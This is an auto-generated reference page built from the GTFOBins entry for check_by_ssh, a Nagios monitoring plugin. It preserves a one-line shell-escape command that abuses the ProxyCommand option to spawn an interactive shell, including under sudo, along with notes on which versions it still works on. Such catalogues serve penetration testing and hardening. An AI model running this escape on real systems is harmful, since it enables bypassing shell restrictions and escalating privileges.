---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# check_by_ssh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `check-by-ssh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/check_by_ssh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [check_by_ssh](../../tools/linux/check-by-ssh.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | check-by-ssh |
| name | check_by_ssh |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/check-by-ssh/ |

## Preserved Source Material

```yaml
_body: ''
_name: check_by_ssh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/check_by_ssh
comment: This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
functions:
  shell:
  - code: check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
    comment: The shell will only last 10 seconds.
    contexts:
      sudo: null
      unprivileged: null
    version: 'When `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios Plugins project in it''s default configuration
      is used, it does not work anymore.


      It does still work on previous versions from the Nagios Plugins project or all versions from the Monitoring Project
      (e.g. used by Ubuntu/Debian).'
```
